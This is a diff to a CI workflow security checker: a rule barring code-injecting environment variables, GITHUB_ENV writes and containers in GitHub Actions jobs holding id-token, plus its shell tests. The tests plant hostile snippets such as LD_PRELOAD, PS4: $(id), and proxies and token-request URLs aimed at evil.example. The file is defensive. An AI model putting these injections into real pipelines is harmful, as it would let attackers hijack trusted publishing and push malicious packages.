@@ -39,7 +39,14 @@
 #      get it); no `secrets: inherit`, and a local reusable workflow is passed
 #      exactly the secrets it declares, which are exactly the ones it reads; a
 #      job that runs `npm publish` with id-token runs no Bun and no dependency
-#      install or build; on the release path no checkout leaves its token in
+#      install or build; (#999) no env of a job holding id-token, at any
+#      level, names code to run first (BASH_ENV, ENV, PATH, NODE_OPTIONS,
+#      LD_*, BASH_FUNC_*, SHELLOPTS, BASHOPTS, PS4, proxies and CAs, HOME,
+#      the runner own GITHUB_*/RUNNER_*/ACTIONS_* names) or is an
+#      expression, every name it sets is one these jobs already use, it has
+#      no container or services, no step of it writes GITHUB_ENV or
+#      GITHUB_PATH, and its shells are plain; on the release path no
+#      checkout leaves its token in
 #      the repository config; no registry login happens on a dry run; and
 #      (#781) a privileged job takes an artifact only by a digest another
 #      job reported as an output, checked in the step right after the download,
@@ -545,6 +552,83 @@ if (rule === "narrow") {
         if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
             (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
           out.push(name + ": publishes with id-token and runs: " + line);
+    }
+    // #999: in a job holding id-token, no env names code to run before or
+    // inside the steps. BASH_ENV and ENV name a file the shell sources
+    // before the script, PATH can put another npm ahead of the real one,
+    // NODE_OPTIONS preloads code into node; and their relatives: LD_*
+    // preloads into every program, BASH_FUNC_* imports a function over any
+    // command, SHELLOPTS or BASHOPTS can turn on xtrace, which expands PS4,
+    // and ACTIONS_ALLOW_UNSECURE_COMMANDS lets any output line set env or
+    // PATH (::set-env, ::add-path). Names compared ignoring case, as a
+    // Windows runner does. An env this rule cannot read (an expression) is
+    // refused too, and so is any step text that names GITHUB_ENV,
+    // GITHUB_PATH or the runner file they point at: a line written there
+    // sets any variable, or the PATH, for every later step of the job. A
+    // shell: is held to the plain ones, as in the publish jobs above, since
+    // `env X=y bash {0}` is env by another name.
+    //
+    // The security review of #999 added: the proxy variables and the CA
+    // ones (a proxy that a trusted extra CA lets terminate TLS sees the
+    // OIDC exchange and the publish), HOME and XDG_CONFIG_HOME (another
+    // .npmrc), NODE_PATH, CDPATH (where a relative cd lands), TMPDIR (a
+    // relative one turned the checked npm tarball path into a git spec,
+    // review of #1000), OPENSSL_CONF and friends (load modules into
+    // openssl, curl and node), and any
+    // GITHUB_*, RUNNER_* or ACTIONS_* name (the runner own variables, the
+    // id-token request pair and the env file paths among them). A list of
+    // bad names is never complete, so the names are also held to the ones
+    // these jobs use today (knownEnv): a new one has to be argued for here.
+    // And no container: or services: at all: container options pass any
+    // docker flag, --env included, and the image runs every step.
+    if (oidc && typeof job.uses !== "string") {
+      const poison = /^(?:BASH_ENV|ENV|PATH|NODE_OPTIONS|LD_[A-Z0-9_]+|BASH_FUNC_.+|SHELLOPTS|BASHOPTS|PS4|(?:HTTPS?|ALL|NO|FTP)_PROXY|NODE_EXTRA_CA_CERTS|NODE_TLS_REJECT_UNAUTHORIZED|SSL_CERT_(?:FILE|DIR)|CURL_CA_BUNDLE|CURL_HOME|HOME|XDG_CONFIG_HOME|NODE_PATH|CDPATH|TMPDIR|OPENSSL_(?:CONF|MODULES|ENGINES)|GITHUB_.+|RUNNER_.+|ACTIONS_.+)$/i;
+      // One set for all of these jobs: every name in it must mean nothing to
+      // bash, node, npm, curl, git, glibc or the runner, only to scripts of
+      // this repo (pins, digests, versions, signing names).
+      const knownEnv = new Set([
+        // release-exec.yml, workflow level: pins read by other jobs.
+        "BUN_VERSION", "NPM_VERSION", "NPM_INTEGRITY", "BINFMT_IMAGE", "BUILDKIT_IMAGE", "SBOM_GENERATOR", "REHEARSAL_REGISTRY_IMAGE",
+        "SIDECAR_BIN", "DRY_RUN",
+        // publish-brain steps.
+        "TARBALL", "SHA256", "VERSION", "PRERELEASE",
+        // publish-sidecar steps.
+        "PUBLISH_ONLY", "BUILT_VERSION", "GIVEN_VERSION", "SHA_LINUX_X64", "SHA_LINUX_ARM64", "SHA_DARWIN_ARM64", "SHA_DARWIN_X64", "SHA_WIN32_X64", "DIGESTS",
+        // The Windows signers.
+        "GCP_KMS_KEYRING", "ALLOW_UNSIGNED_WINDOWS", "GCP_ACCESS_TOKEN", "GCP_KMS_KEY_ALIAS",
+      ]);
+      if (job.container !== undefined) out.push(name + ": runs in a container: in a job holding id-token");
+      if (job.services !== undefined) out.push(name + ": runs services: in a job holding id-token");
+      const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
+      const fsteps = flatSteps(job.steps);
+      const stepLabel = (st, via, i) => "step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
+      const levels = [["workflow", doc.env], ["job", job.env], ["container", job.container?.env],
+        ...fsteps.map(({ st, via }, i) => [stepLabel(st, via, i), st.env])];
+      for (const [lvl, e] of levels) {
+        if (e === undefined || e === null) continue;
+        if (typeof e !== "object" || Array.isArray(e)) {
+          out.push(name + ": " + lvl + " env is " + JSON.stringify(e) + ", not a mapping this rule can read, in a job holding id-token");
+          continue;
+        }
+        for (const k of Object.keys(e))
+          if (poison.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job holding id-token");
+          else if (!knownEnv.has(k)) out.push(name + ": " + lvl + " env sets " + k + ", a name no job holding id-token uses yet: set it at the level of the job that reads it, or add it to knownEnv with a reason");
+      }
+      // ...nor set in the script itself (review of #999): an assignment or
+      // an export of such a name in a run: is the same env by another name.
+      for (const [i, { st, via }] of fsteps.entries()) {
+        const run = (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map(stripComment).join("\n");
+        for (const m of run.matchAll(/(?:^|[\s;&|(`])(?:(?:export|declare|typeset|local|readonly|env)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)\+?=/gm))
+          if (poison.test(m[1])) out.push(name + ": " + stepLabel(st, via, i) + " sets " + m[1] + " in its script, in a job holding id-token");
+      }
+      for (const [i, { st, via }] of fsteps.entries()) {
+        const text = [typeof st.run === "string" ? st.run : "", ...Object.values(st.env && typeof st.env === "object" ? st.env : {}).map(String)].join("\n");
+        if (/GITHUB_(?:ENV|PATH)\b|_runner_file_commands/i.test(text))
+          out.push(name + ": " + stepLabel(st, via, i) + " writes GITHUB_ENV or GITHUB_PATH (env for every later step) in a job holding id-token");
+        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
+        if (sh !== undefined && !plainShell.includes(String(sh).trim()))
+          out.push(name + ": " + stepLabel(st, via, i) + " runs in shell: " + sh + " in a job holding id-token");
+      }
     }
     // publish-brain is the tarball-only shape (#682): no checkout, nothing
     // but setup-node and download-artifact, npm itself as the only global
@@ -1793,6 +1877,102 @@ expect_caught 'a refusal that tests GITHUB_TOKEN instead' catalog-pr "$WORKFLOWS
 expect_caught 'a PR opened before the refusal runs' catalog-pr "$WORKFLOWS/sync-pieces-catalog.yml" \
 	'      - name: Refuse without the catalog PR token' $'      - name: Open early\n        uses: peter-evans/create-pull-request@5f6978faf089d4d20b00c7766989d076bb2fc7f1 # v8.1.1\n        with:\n          token: ${{ secrets.RELEASE_PR_TOKEN }}\n      - name: Refuse without the catalog PR token' \
 	'publish: step Open early: no earlier step refuses when RELEASE_PR_TOKEN is empty'
+
+echo
+echo "no env in a job holding id-token names code to run first, and no step writes env for the next (#999)"
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	expect_caught 'BASH_ENV in the brain publish job env (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: /tmp/x\n' \
+		'publish-brain: job env sets BASH_ENV in a job holding id-token'
+	expect_caught 'ENV in the sidecar workflow env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  ENV: /tmp/x\n' \
+		'publish-sidecar: workflow env sets ENV in a job holding id-token'
+	expect_caught 'PATH in the sidecar publish step env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          PATH: /tmp/evil:/usr/bin:/bin\n        run: |' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets PATH in a job holding id-token'
+	expect_caught 'NODE_OPTIONS in the brain publish step env (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NODE_OPTIONS: --require /tmp/x.js\n        run: |' \
+		'publish-brain: step Ensure npm supports Trusted Publishing env sets NODE_OPTIONS in a job holding id-token'
+	expect_caught 'node_options in another case (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          node_options: --require /tmp/x.js\n' \
+		'publish-brain: step Publish to npm env sets node_options in a job holding id-token'
+	expect_caught 'LD_PRELOAD in the Windows signer job env, which publishes nothing (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    env:\n      LD_PRELOAD: /tmp/x.so\n' \
+		'sign-sidecar-windows: job env sets LD_PRELOAD in a job holding id-token'
+	expect_caught 'PATH in the installer signer job env (#999)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'  sign-windows:\n    needs: [resolve, build-windows]\n' $'  sign-windows:\n    needs: [resolve, build-windows]\n    env:\n      PATH: /tmp/evil:/usr/bin:/bin\n' \
+		'sign-windows: job env sets PATH in a job holding id-token'
+	expect_caught 'an exported bash function over npm (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          BASH_FUNC_npm%%: "() { echo x; }"\n        run: |' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets BASH_FUNC_npm%% in a job holding id-token'
+	expect_caught 'xtrace turned on through SHELLOPTS, with PS4 to expand (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          SHELLOPTS: xtrace\n          PS4: $(id)\n' \
+		'publish-brain: step Publish to npm env sets SHELLOPTS in a job holding id-token'
+	expect_caught 'PS4 on its own (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          PS4: $(id)\n' \
+		'publish-brain: step Publish to npm env sets PS4 in a job holding id-token'
+	expect_caught 'set-env and add-path commands allowed again (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"\n' \
+		'publish-brain: workflow env sets ACTIONS_ALLOW_UNSECURE_COMMANDS in a job holding id-token'
+	expect_caught 'NODE_OPTIONS in a job container env (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    container:\n      image: x\n      env:\n        NODE_OPTIONS: --require /tmp/x.js\n    # Same requirement' \
+		'publish-sidecar: container env sets NODE_OPTIONS in a job holding id-token'
+	expect_caught 'a job env given as an expression, which the rule cannot read (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env: ${{ fromJSON(vars.PUBLISH_ENV) }}\n' \
+		'publish-brain: job env is "${{ fromJSON(vars.PUBLISH_ENV) }}", not a mapping this rule can read'
+	expect_caught 'a step env given as an expression (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env: ${{ fromJSON(vars.PUBLISH_ENV) }}\n        run: |' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing env is "${{ fromJSON(vars.PUBLISH_ENV) }}", not a mapping'
+	expect_caught 'BASH_ENV set for later steps through GITHUB_ENV (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'            VERSION="${GIVEN_VERSION:-}"\n' $'            VERSION="${GIVEN_VERSION:-}"\n            echo "BASH_ENV=/tmp/x" >> "$GITHUB_ENV"\n' \
+		'publish-sidecar: step Resolve the version this call publishes writes GITHUB_ENV or GITHUB_PATH'
+	expect_caught 'a directory put ahead of npm through GITHUB_PATH (#999)' narrow "$WORKFLOWS/release-exec.yml" \
+		'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::pack-brain reported no digest"; exit 1; }' $'          echo /tmp/evil >> "${GITHUB_PATH}"\n          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::pack-brain reported no digest"; exit 1; }' \
+		'publish-brain: step Verify the tarball writes GITHUB_ENV or GITHUB_PATH'
+	expect_caught 'the runner env file written by its path (#999)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'      # For scripts/sign-windows.sh and the committed certificate chain.\n' $'      - run: cat x >> "$RUNNER_TEMP"/_runner_file_commands/set_env_1\n      # For scripts/sign-windows.sh and the committed certificate chain.\n' \
+		'sign-windows: step 0 writes GITHUB_ENV or GITHUB_PATH'
+	expect_caught 'a default shell that sets BASH_ENV, in a job that publishes nothing (#999)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    defaults:\n      run:\n        shell: env BASH_ENV=/tmp/x bash -e {0}\n' \
+		'sign-sidecar-windows: step Verify the binary runs in shell: env BASH_ENV=/tmp/x bash -e {0} in a job holding id-token'
+	expect_caught 'a proxy for the npm publish (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          HTTPS_PROXY: http://proxy.evil.example:3128\n' \
+		'publish-brain: step Publish to npm env sets HTTPS_PROXY in a job holding id-token'
+	expect_caught 'an extra CA node trusts, for that proxy (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  NPM_VERSION: "12.1.0"\n' $'  NPM_VERSION: "12.1.0"\n  NODE_EXTRA_CA_CERTS: /tmp/evil-ca.pem\n' \
+		'publish-sidecar: workflow env sets NODE_EXTRA_CA_CERTS in a job holding id-token'
+	expect_caught 'HOME moved, so npm reads another .npmrc (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    env:\n      HOME: /tmp/evil-home\n' \
+		'publish-brain: job env sets HOME in a job holding id-token'
+	expect_caught 'GITHUB_ENV set as an env name (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        env:\n          GITHUB_ENV: /tmp/evil-env\n' \
+		'publish-brain: step Publish to npm env sets GITHUB_ENV in a job holding id-token'
+	expect_caught 'the id-token request URL set as an env name (#999 security review)' narrow "$WORKFLOWS/installer-release.yml" \
+		$'  sign-windows:\n    needs: [resolve, build-windows]\n' $'  sign-windows:\n    needs: [resolve, build-windows]\n    env:\n      ACTIONS_ID_TOKEN_REQUEST_URL: https://evil.example/\n' \
+		'sign-windows: job env sets ACTIONS_ID_TOKEN_REQUEST_URL in a job holding id-token'
+	expect_caught 'a name no job holding id-token uses yet (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          SOMETHING_NEW: x\n        run: |' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing env sets SOMETHING_NEW, a name no job holding id-token uses yet'
+	expect_caught 'a container whose options set env (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n' $'    needs: [validate-tag, sidecar-build, pack-brain]\n    runs-on: ubuntu-latest\n    container:\n      image: node:22\n      options: --env NODE_OPTIONS=--require=/tmp/x.js\n' \
+		'publish-brain: runs in a container: in a job holding id-token'
+	expect_caught 'a service container beside the signer (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n' $'  sign-sidecar-windows:\n    needs: [resolve, build-sidecar-windows]\n    services:\n      x:\n        image: evil\n' \
+		'sign-sidecar-windows: runs services: in a job holding id-token'
+	expect_caught 'a proxy exported in the publish script (#999 security review)' narrow "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          export HTTPS_PROXY=http://proxy.evil.example:3128\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm sets HTTPS_PROXY in its script, in a job holding id-token'
+	expect_caught 'NODE_OPTIONS in front of the publish command (#999 security review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		'            npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' '            NODE_OPTIONS=--require=/tmp/x.js npm publish --access public "${flags[@]}" 2>&1 | tee "$err"' \
+		'publish-sidecar: step Publish platform packages sets NODE_OPTIONS in its script, in a job holding id-token'
+	expect_caught 'a relative TMPDIR for the npm publish job (#1000 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
+		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      TMPDIR: git+https:/evil.example/r\n    # Same requirement' \
+		'publish-sidecar: job env sets TMPDIR in a job holding id-token'
+	expect_caught 'an OpenSSL config that loads a module (#1000 review)' narrow "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          OPENSSL_CONF: /tmp/evil.cnf\n        run: |' \
+		'publish-brain: step Ensure npm supports Trusted Publishing env sets OPENSSL_CONF in a job holding id-token'
+}
 
 echo
 echo "no checkout leaves a write token or a secret on disk, and a push brings its own credential (#982)"
